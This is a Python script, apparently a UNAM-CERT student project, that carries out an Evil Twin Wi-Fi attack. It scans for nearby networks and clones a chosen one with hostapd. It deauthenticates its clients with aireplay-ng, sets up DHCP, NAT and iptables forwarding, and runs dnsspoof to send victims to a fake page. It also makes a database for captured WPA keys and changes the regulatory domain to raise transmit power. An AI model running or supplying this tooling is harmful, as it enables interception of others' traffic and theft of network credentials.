#!/usr/bin/env python
# -*- encoding: utf-8 -*-
#UNAM-CERT
#Integrantes:
#Pedro Rdriguez
#Leal Gonzalez Ignacio

import argparse
import optparse
import subprocess
import ConfigParser
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys, os, signal
import threading
import netifaces

def addOptions():
    '''
    Funcion que parsea los datos que se tomen de linea de comandos como opciones para ejecutar el programa
    Devuelve un objeto cuyos atributos son las opciones de ejecucion
    '''
    parser = argparse.ArgumentParser(description='Evil Twin')
    parser.add_argument('-u'    , '--use_mode'   , dest='mode'      , required=True  , default=None       , help='Modo de uso del programa: Interactivo, Argumentos, Archivo')
    parser.add_argument('-i'    , '--interface' , dest='interface' , type=str       , required=True     , default=None   , help='Interface to use for sniffing and packet injection')
    parser.add_argument('-b'    , '--bssid'     , dest='bssid'     , type=str       , required=False    , default=None   , help='Direccion MAC del AP')
    parser.add_argument('-e'    , '--essid'     , dest='essid'     , type=str       , required=False    , default=None   , help='Nombre de la red inalambrica')
    parser.add_argument('-c'    , '--channel'   , dest='channel'   , type=int       , required=False    , choices=range(1,16) , default=int(5) , help='Canal del AP ')
    parser.add_argument('-p'    , '--txpower'   , dest='txpower'   , type=int       , required=False    , choices=range(20,31,10), default=int(20) , help='Potencia de la antena')
    parser.add_argument('-f'    , '--first_ip'  , dest='first_ip'  , type=str       , required=False    , default=None   , help='Primer IP del pool DHCP')
    parser.add_argument('-l'    , '--last_ip'   , dest='last_ip'   , type=str       , required=False    , default=None   , help='Ultima IP del pool DHCP')
    parser.add_argument('-m'    , '--mask'      , dest='mask'      , type=str       , required=False    , default=None   , help='Mascara')
    parser.add_argument('-g'    , '--gateway'   , dest='gateway'   , type=str       , required=False    , default=None   , help='Gateway')
    parser.add_argument('-C'    , '--cdb'       , dest='cdb'       , required=False , default=None      , help='Creacion de una base de datos')
    parser.add_argument('-D'    , '--ddb'       , dest='ddb'       , required=False , default=None      , help='Eliminacion de una base de datos')
    parser.add_argument('-F'    , '--file'      , dest='config'    , required=False , default=None      , help='Indica el archivo el cual contiene las opciones para ejecutar el programa')
    args = parser.parse_args()
    return args

def addOptionsFile(configfile):
    '''
    Funcion que parsea los datos que se tomen de un archivo como opciones para ejecutar el programa
    Recibe el nombre del archivo del que se obtendrán las opciones de ejecucion
    Devuelve un objeto cuyos atributos son las opciones de ejecucion
    '''
    config = ConfigParser.ConfigParser()
    config.read(configfile)
    parser = optparse.OptionParser()
    parser.add_option('-u'      , '--use_mode'  , dest='mode'       , default=config.get("Options", "use_mode")     , help='Modo de uso del programa: Interactivo, Argumentos, Archivo')
    parser.add_option('-i'      , '--interface' , dest='interface'  , type=str       , default=config.get("Options", "interface")    , help='Interface to use for sniffing and packet injection')
    parser.add_option('-b'      , '--bssid'     , dest='bssid'      , type=str       , default=config.get("Options", "bssid")        , help='Direccion MAC del AP')
    parser.add_option('-e'      , '--essid'     , dest='essid'      , type=str       , default=config.get("Options", "essid")        , help='Nombre de la red inalambrica')
    parser.add_option('-c'      , '--channel'   , dest='channel'    , type=int       , default=int(config.get("Options", "channel")) , help='Canal del AP')
    parser.add_option('-p'      , '--txpower'   , dest='txpower'    , type=int       , default=int(config.get("Options", "txpower")) , help='Potencia de la antena')
    parser.add_option('-f'      , '--first_ip'  , dest='first_ip'   , type=str       , default=config.get("Options", "first_ip")     , help='Primer IP del pool DHCP')
    parser.add_option('-l'      , '--last_ip'   , dest='last_ip'    , type=str       , default=config.get("Options","last_ip")       , help='Ultima IP del pool DHCP')
    parser.add_option('-m'      , '--mask'      , dest='mask'       , type=str       , default=config.get("Options", "mask")         , help='Mascara')
    parser.add_option('-g'      , '--gateway'   , dest='gateway'    , type=str       , default=config.get("Options","gateway")       , help='Gateway')
    parser.add_option('-C'      , '--cdb'       , dest='cdb'        , default=config.get("Options", "cdb")          , help='Creacion de una base de datos')
    parser.add_option('-D'      , '--ddb'       , dest='ddb'        , default=config.get("Options", "ddb")          , help='Eliminacion de una base de datos')
    parser.add_option('-F'      , '--file'      , dest='config'     , default=None                                  , help='Archivo del cual se tomara la configuracon a implemetar')
    args = parser.parse_args()
    return args

channel_list = []
essid_list = []
bssid_list = []
enc_list = []
networks = {} # dictionary to store APs
interface_list = [] # Lista para interfaces
# Beacons and ProbeResponses.
def sniffAP(p):
    if ( (p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp))
                 and not networks.has_key(p[Dot11].addr3)):
        essid      = p[Dot11Elt].info if '\x00' not in p[Dot11Elt].info and p[Dot11Elt].info != '' else 'ESSID Oculto'
        bssid      = p[Dot11].addr3
        channel    = int( ord(p[Dot11Elt:3].info))
        pa = p[Dot11Elt]
        cap = p.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
        crypto = set()
        while isinstance(pa, Dot11Elt):
            if pa.ID == 48:
                crypto.add("WPA2")
            elif pa.ID == 221 and pa.info.startswith('\x00P\xf2\x01\x01\x00'):
                crypto.add("WPA")
            pa = pa.payload
        if not crypto:
            if 'privacy' in cap:
                crypto.add("WEP")
            else:
                crypto.add("OPN")
        enc = '/'.join(crypto)
        if bssid not in networks:
            networks[bssid] = ( essid, channel, enc )
            channel_list.append(channel)
            essid_list.append(essid)
            bssid_list.append(bssid)
            enc_list.append(enc)
            # Imprime cada que encuentra una nueva red
            print "{0:3}\t{1:10}\t{2:20}\t{3:20}".format(int(channel), enc, bssid, essid)

def sniff_process(interface):
    # Imprimir cabecera del escaneo
    print "\nEl escaneo terminara el 15 segundos u oprime CTRL + C"
    print "{0:3}\t{1:10}\t{2:20}\t{3:20}".format('CH','ENC','BSSID','SSID')
    # Ininicamos el Sniffer
    sniff(iface=interface,prn=sniffAP,timeout=15)

def clean_screen():
    os.system('clear')

def chose_iface(interface):
    if interface == None:
        # Listar interfaces disponibles
        interface_list = netifaces.interfaces()
        print "======= Interfaces disponibles =======\n"
        for i, interface in enumerate(interface_list):
            print "\t%02d: %s" %(i, str(interface))
        target_interface = raw_input('\nIntroduce la interface a utilizar en modo monitor ')
        while target_interface not in interface_list:
            target_interface = raw_input('Interface no se encuentra... Por favor introduce otro: ')
        # Cambiamos interfaz a modo: Monitor
        print 'Cambiando interface ' + target_interface + ' a modo monitor '
        return target_interface
    else:
        # Listar interfaces disponibles
        interface_list = netifaces.interfaces()
        while interface not in interface_list:
            interface = raw_input('Interface no se encuentra... Por favor introduce otro: ')
        # Cambiamos interfaz a modo: Monitor
        print 'Cambiando interface ' + interface + ' a modo monitor '
        return interface

def monitor_iface(target_interface):
    interface_list = netifaces.interfaces()
    while target_interface not in interface_list:
        print "La interface %s no existe" % (target_interface)
        sys.exit()
    os.system("airmon-ng start %s 1>/dev/null" % (target_interface))
    interface = str(target_interface)
    return interface

def iface_txpower(interface,mode,txpower):
    # Cambiar potencia de antena
    if mode == "interactivo":
        target_txpower = raw_input('\n¿Deseas incrementar la potencia de tu antena a 30dB? (s/n)')
        if target_txpower == 's':
            os.system("ifconfig %s down" % (interface))
            os.system("iw reg set GY") #GY o BO
            os.system("ifconfig %s up" % (interface))
            os.system("iwconfig %s txpower 30" % (interface))
        elif target_txpower == 'n':
            pass
    elif txpower == None:
        pass 
    else:
        #print "iface_txpower args"
        os.system("ifconfig %s down" % (interface))
        os.system("iw reg set GY") #GY o BO
        os.system("ifconfig %s up" % (interface))
        os.system("iwconfig %s txpower %s" % (interface,str(txpower)))

def run_dnsmasq(interface,first_ip,last_ip,mask,gateway):
    # Colocamos la informacion que ira en el archivo de configuracion dnsmasq.conf
    dnsmasq_text = ['interface='+interface,
                    'dhcp-range='+first_ip+','+last_ip+','+mask+','+'12m',
                    'dhcp-option=3,'+gateway,
                    'dhcp-option=6,'+gateway,
                    'server=8.8.8.8',
                    'server=8.8.4.4',
                    'log-queries',
                    'log-dhcp',
                    'listen-address=127.0.0.1',
                    'dhcp-authoritative'
                    ]
    # Crear archivo dnsmasq.conf
    outF = open("dnsmasq.conf", "w")
    for line in dnsmasq_text:
      # Escribimos cada linea en nuestro archivo de configuracion
      outF.write(line)
      outF.write("\n")
    outF.close()

    # Creamos DHCP con dnsmasq
    gateway_dhcp = ['ifconfig '+interface+' '+gateway+' netmask '+mask,
                    'iptables --flush',
                    'iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE',
                    'iptables --append FORWARD --in-interface '+interface+' -j ACCEPT',
                    'echo 1 > /proc/sys/net/ipv4/ip_forward'
                    ]
    # Creamos el archivo con la configuracion de la intefaz wlan0mon y el dhcp
    outF = open("conf_gateway_dhcp.txt", "w")
    for line in gateway_dhcp:
      # Escribimos cada linea en nuestro archivo de configuracion
      outF.write(line)
      outF.write("\n")
    outF.close()
    # Leemos el archivo y ejecutamos cada instruccion
    outF = open("conf_gateway_dhcp.txt", "r")
    lines = outF.readlines()
    for line in lines:
      # Ejecutamos cada linea en el archivo.
      os.system(line)
    outF.close()
    # Subproceso
    p = subprocess.Popen(["xterm", "-e", "dnsmasq", "-C", "./dnsmasq.conf", "-d"])

def conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway):
    dnsmasq_text = []
    if mode == "interactivo":
        net_opts = {'1': ('192.168.1.10', '192.168.1.254', '255.255.255.0', '192.168.1.1'), '2': ('10.0.0.10', '10.0.0.254', '255.255.255.0', '10.0.0.1')}
        print "======= Configuracion de Red Disponible =======\n\t1. 192.168.1.0/24\n\t2. 10.0.0.0/24"
        target_network = raw_input('Elige una opcion: ')
        while target_network not in net_opts:
            target_network = raw_input('El numero de red que escogiste es incorrecto, intenta de nuevo: ')
        # Configuramos cada parametro con la opcion elegida
        first_ip = net_opts[target_network][0]
        last_ip  = net_opts[target_network][1]
        mask     = net_opts[target_network][2]
        gateway  = net_opts[target_network][3]
        print gateway
        run_dnsmasq(interface,first_ip,last_ip,mask,gateway)
    else:
        run_dnsmasq(interface,first_ip,last_ip,mask,gateway)
        pass

def run_rogueAP(interface,channel,essid):
    hostapd_text = ['interface='+interface,
                  'driver=nl80211',
                  'ssid='+essid,
                  'hw_mode=g',
                  'channel='+str(channel),
                  'macaddr_acl=0',
                  'ignore_broadcast_ssid=0'
                 ]
    # Crear archivo hostapd.conf
    outF = open("hostapd.conf", "w")
    for line in hostapd_text:
      # write line to output file
      outF.write(line)
      outF.write("\n")
    outF.close()
    # Subproceso
    p = subprocess.Popen(["xterm", "-e", "hostapd", "./hostapd.conf"])

def rogueAP(interface,channel,essid,mode):
    channels = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15']
    if mode == "interactivo":
        target_channel = raw_input('Selecciona el canal en el que trabajara RougeAP [1-15]: ')
        while target_channel not in channels:
            target_channel = raw_input('Canal incorrecto, intenta de nuevo: ')
        run_rogueAP(interface,target_channel,essid)
    else:
        print "run_rogueAP in args or file mode"
        run_rogueAP(interface,channel,essid)

def dnssnoof(interface):
    p = subprocess.Popen(["xterm", "-e", "dnsspoof", "-i", interface])

def desAuthentication(interface,bssid):
    p = subprocess.Popen(["xterm", "-e", "aireplay-ng", "-00", "-a", bssid, interface])

def create_db():
    os.system("./mysql-db-create.sh rogueap rogueuser roguepassword wpa_keys")

def delete_db():
    os.system("./mysql-db-delete.sh rogueap rogueuser")
    pass

def use_modeI(mode):
    interface = None
    bssid     = None
    essid     = None
    channel   = None
    txpower   = None
    first_ip  = None
    last_ip   = None
    mask      = None
    gateway   = None
    target_interface = chose_iface(interface)
    #Cambiamos a modo: Monitor
    interface = monitor_iface(target_interface)
    # Cambair la potencia de la antena.
    iface_txpower(interface,mode,txpower)
    # Proceso de sniffer para redes WIFI
    sniff_process(interface)
    # Limpiamos la terninal antes de mostrar los resultados
    clean_screen()
    # Mostramos redes disponibles
    print "======= Redes Inalambricas Disponibles =======\n"
    print "{0:3}\t{1:5}\t{2:28}\t{3:20}\t{4:5}".format('ID', 'Canal', 'ESSID', 'BSSID', 'ENC')
    for i in range(len(essid_list)):
        print "{0:3}\t{1:5}\t{2:28}\t{3:20}\t{4:5}".format(i, channel_list[i], essid_list[i], bssid_list[i], enc_list[i])
    target_bssid = raw_input('Introduce el BSSID de la red Wifi a clonar: ')
    while target_bssid not in networks:
        raw_input('BSSID no se encuentra... Por favor introduce otro: ')
    bssid = target_bssid
    essid = networks[bssid][0]
    # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
    rogueAP(interface,channel,essid,mode)
    # Llamamos a la funcion desAuthentication()
    desAuthentication(interface,bssid)
    # Llamamos a la funcion conf_dnsmasq() para crear DHCP que usara RogueAP
    conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway)
    # Llamamos la funcion dnssnoof() para redirigir a nuetra Fake page
    dnssnoof(interface)

def use_modeF(mode, interface, bssid, essid, channel, txpower, first_ip, last_ip, mask, gateway):
    target_interface = chose_iface(interface)
    #Cambiamos a modo: Monitor
    interface = monitor_iface(target_interface)
    # Cambair la potencia de la antena.
    iface_txpower(interface,mode,txpower)
    # Limpiamos la terninal antes de mostrar los resultados
    clean_screen()
    # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
    rogueAP(interface,channel,essid,mode)
    # Llamamos a la funcion desAuthentication()
    desAuthentication(interface,bssid)
    # Llamamos a la funcion conf_dnsmasq() para crear DHCP que usara RogueAP
    conf_dnsmasq(mode,interface,first_ip,last_ip,mask,gateway)
    # Llamamos la funcion dnssnoof() para redirigir a nuetra Fake page
    dnssnoof(interface)
    
def use_mode(opts):
    if opts.mode == "interactivo":
        interface = None
        bssid     = None
        essid     = None
        channel   = None
        txpower   = None
        first_ip  = None
        last_ip   = None
        mask      = None
        gateway   = None
        if opts.mode == "interactivo":
            # Listamos interfaces
            target_interface = chose_iface(interface)
            #Cambiamos a modo: Monitor
            interface = monitor_iface(target_interface)
            # Cambair la potencia de la antena.
            iface_txpower(interface,opts)
            # Proceso de sniffer para redes WIFI
            sniff_process(interface)
            # Limpiamos la terninal antes de mostrar los resultados
            clean_screen()
            # Mostramos redes disponibles
            print "======= Redes Inalambricas Disponibles =======\n"
            print "{0:3}\t{1:5}\t{2:28}\t{3:20}\t{4:5}".format('ID', 'Canal', 'ESSID', 'BSSID', 'ENC')
            for i in range(len(essid_list)):
                print "{0:3}\t{1:5}\t{2:28}\t{3:20}\t{4:5}".format(i, channel_list[i], essid_list[i], bssid_list[i], enc_list[i])
            target_bssid = raw_input('Introduce el BSSID de la red Wifi a clonar: ')
            while target_bssid not in networks:
                raw_input('BSSID no se encuentra... Por favor introduce otro: ')
            bssid = target_bssid
            essid = networks[bssid][0]
            # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
            rogueAP(interface,channel,essid)
            # Llamamos a la funcio conf_dnsmasq() para crear DHCP que usara RogueAP
            conf_dnsmasq(opts,interface,first_ip,last_ip,mask,gateway)
            # Llamamos la funcion dnssnoof() para redirigir a nuetra Fake page
            dnssnoof(interface)
            # Llamamos a la funcion desAuthentication()
            desAuthentication(interface,bssid)

    elif opts.mode == "file":
        print "HOLI CRAYOLI"
    elif opts.mode == "args":
        interface = opts.interface
        bssid     = opts.bssid
        essid     = opts.essid
        channel   = opts.channel
        txpower   = opts.txpower
        first_ip  = opts.first_ip
        last_ip   = opts.last_ip
        mask      = opts.mask
        gateway   = opts.gateway
        print opts
        # Modo monitor
        interface = monitor_iface(interface)
        if txpower != None:
            iface_txpower(interface,opts)
        # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
        rogueAP(interface,channel,essid)

        '''
        Falta hacer ajustes
        # Llamamos a la funcio conf_dnsmasq() para crear DHCP que usara RogueAP
        conf_dnsmasq(args,interface,first_ip,last_ip,mask,gateway)
        # Llamamos la funcion dnssnoof() para redirigir a nuetra Fake page
        dnssnoof(interface)
        # Llamamos a la funcion desAuthentication()
        desAuthentication(interface,bssid)
        '''
    else:
        print "\nElige un modo de uso corecto:\n\t[interactivo, args , file]"
    return interface,bssid,essid,channel,txpower,first_ip,last_ip,mask,gateway

def use():
    print "Use: %s [opciones]" % __file__
    print ""
    print "   -cdb,   --cdb         Creara la base de datos"
    print ""
    print "Ejemplo:    %s -cdb" % __file__
    print ""
    print "   -cdb,   --ddb         Borra la base de datos"
    print ""
    print "Ejemplo:    %s -ddb" % __file__
    print ""
    print "   -mode,   --mode         Modos de uso [interactivo, arg y file]"
    print ""
    print "---- interactivo ----\n"
    print "Ejemplo:    %s -mode interactivo" % __file__
    print ""
    print "---- file ----\n"
    print "Ejemplo:    %s -mode -file <Nombre del archivo>" % __file__
    print ""
    print "---- args ----\n"
    print "   -i,     --interface    Interface de red inalambrica a utilizar."
    print "   -bssid, --bssid        Direccion MAC de AP a clonar"
    print "   -essid, --essid        Nombre del AP a clonar"
    print "   -c,     --channel      Canal que ocupara la antena inalambrica"
    print "   -p,     --txpower      Potencia de la antena [unicamente 30 :(]"
    print "   -f_ip,  --first_ip     Primer IP del pool DHCP"
    print "   -l_ip,  --last_ip      Ultima IP del pool DHCP"
    print "   -m,     --mask         Mascara de red"
    print "   -g,     --gateway      Gateway a utilizar"
    print ""
    print "Ejemplo:  %s -mode args -i <interface> -bssid <FF:FF:FF:FF:FF:FF> -essid <RougeAP> ..." % __file__

if __name__ == "__main__":
    opts = addOptions()
    if opts.cdb != None and len(sys.argv) == 2:
        print "Creando base de datos..."
        #c_database()
    elif opts.ddb != None and len(sys.argv) == 2:
        print "Borrando base de datos"
        #d_database()
    elif opts.mode == "interactivo":
        print "Mode: Interactivo"
        '''
        parser = argparse.ArgumentParser(description='Implementacion de Evil Twin Attack')
        parser.add_argument('-mode' , '--use-mode'  , dest='mode'      , type=str, required=False, default='interactivo' ,help='Modo de uso del programa: Interactivo, Argumentos, Archivo')
        
        parser.add_argument('-i'    , '--interface' , dest='interface' , type=str, required=False, help='Interface to use for sniffing and packet injection')
        parser.add_argument('-bssid', '--bssid'     , dest='bssid'     , type=str, required=False, help='Direccion MAC del AP')
        parser.add_argument('-essid', '--essid'     , dest='essid'     , type=str, required=False, help='Nombre de la red inalambrica')
        parser.add_argument('-c'    , '--channel'   , dest='channel'   , type=int, required=False, choices=range(1,16) ,help='Canal del AP ')
        parser.add_argument('-p'    , '--txpower'   , dest='txpower'   , type=int, required=False, choices=range(20,31,10), help='Potencia de la antena')
        parser.add_argument('-f_ip' , '--first_ip'  , dest='first_ip'  , type=str, required=False, help='Primer IP del pool DHCP')
        parser.add_argument('-l_ip' , '--last_ip'   , dest='last_ip'   , type=str, required=False, help='Ultima IP del pool DHCP')
        parser.add_argument('-m'    , '--mask'      , dest='mask'      , type=str, required=False, help='Mascara')
        parser.add_argument('-g'    , '--gateway'   , dest='gateway'   , type=str, required=False, help='Gateway')
        
        args = parser.parse_args()
        '''
        print opts.mode
        use_modeI(opts.mode)
        #os.system('airmon-ng stop %s' %(interface))

    elif opts.mode == 'args' and len(sys.argv) > 4:
        print "Mode: args"
        '''
        parser = argparse.ArgumentParser(description='Implementacion de Evil Twin Attack')
        parser.add_argument('-mode' , '--use-mode'  , dest='mode'      , required=False, default='args', help='Modo de uso del programa: Interactivo, Argumentos, Archivo')
        parser.add_argument('-i'    , '--interface' , dest='interface' , type=str, required=True,  help='Interface to use for sniffing and packet injection')
        parser.add_argument('-bssid', '--bssid'     , dest='bssid'     , type=str, required=False, help='Direccion MAC del AP')
        parser.add_argument('-essid', '--essid'     , dest='essid'     , type=str, required=True, help='Nombre de la red inalambrica')
        parser.add_argument('-c'    , '--channel'   , dest='channel'   , type=int, required=True, choices=range(1,16) ,help='Canal del AP ')
        parser.add_argument('-p'    , '--txpower'   , dest='txpower'   , type=int, required=False, choices=range(20,31,10), help='Potencia de la antena')
        parser.add_argument('-f_ip' , '--first_ip'  , dest='first_ip'  , type=str, required=False, help='Primer IP del pool DHCP')
        parser.add_argument('-l_ip' , '--last_ip'   , dest='last_ip'   , type=str, required=False, help='Ultima IP del pool DHCP')
        parser.add_argument('-m'    , '--mask'      , dest='mask'      , type=str, required=False, help='Mascara')
        parser.add_argument('-g'    , '--gateway'   , dest='gateway'   , type=str, required=False, help='Gateway')
        args = parser.parse_args()
        '''
        use_mode(opts)

    elif opts.mode == 'file':
        '''
        parser = argparse.ArgumentParser(description='Implementacion de Evil Twin Attack')
        parser.add_argument('-mode' , '--mode'  , dest='mode', required=False, action='store_true', help='Archivo del cual se tomara la configuracon a implemetar')
        parser.add_argument('-file' , '--file'  , dest='file', type=str, required=True, help='Archivo del cual se tomara la configuracon a implemetar')
        args = parser.parse_args()
        print "Mode: Archivo"
        #use_mode(args)
        '''
        
        opts = addOptionsFile(opts.config)
        print opts[0].essid
        use_modeF(opts[0].mode, opts[0].interface, opts[0].bssid, opts[0].essid, opts[0].channel, opts[0].txpower, opts[0].first_ip, opts[0].last_ip, opts[0].mask, opts[0].gateway)
    else:
        use()



 